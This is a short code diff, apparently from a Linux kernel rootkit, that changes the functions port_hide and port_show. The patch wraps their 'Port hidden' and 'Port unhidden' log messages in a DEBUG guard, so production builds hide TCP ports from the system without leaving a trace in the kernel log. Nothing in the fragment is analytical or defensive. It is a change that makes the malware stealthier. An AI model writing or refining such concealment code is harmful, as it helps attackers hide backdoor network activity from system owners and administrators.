@@ -57,7 +57,9 @@ void port_hide(unsigned short port) {
   for (i = 0; i < MAX_TCP_PORTS; i++) {
     if (hide_port[i] == 0) {
       hide_port[i] = port;
+#ifdef DEBUG
       printk(KERN_INFO "Port %d hidden\n", port);
+#endif
       return;
     }
   }
@@ -68,7 +70,9 @@ void port_show(unsigned short port) {
   for (i = 0; i < MAX_TCP_PORTS; i++) {
     if (hide_port[i] == port) {
       hide_port[i] = 0;
+#ifdef DEBUG
       printk(KERN_INFO "Port %d unhidden\n", port);
+#endif
       return;
     }
   }
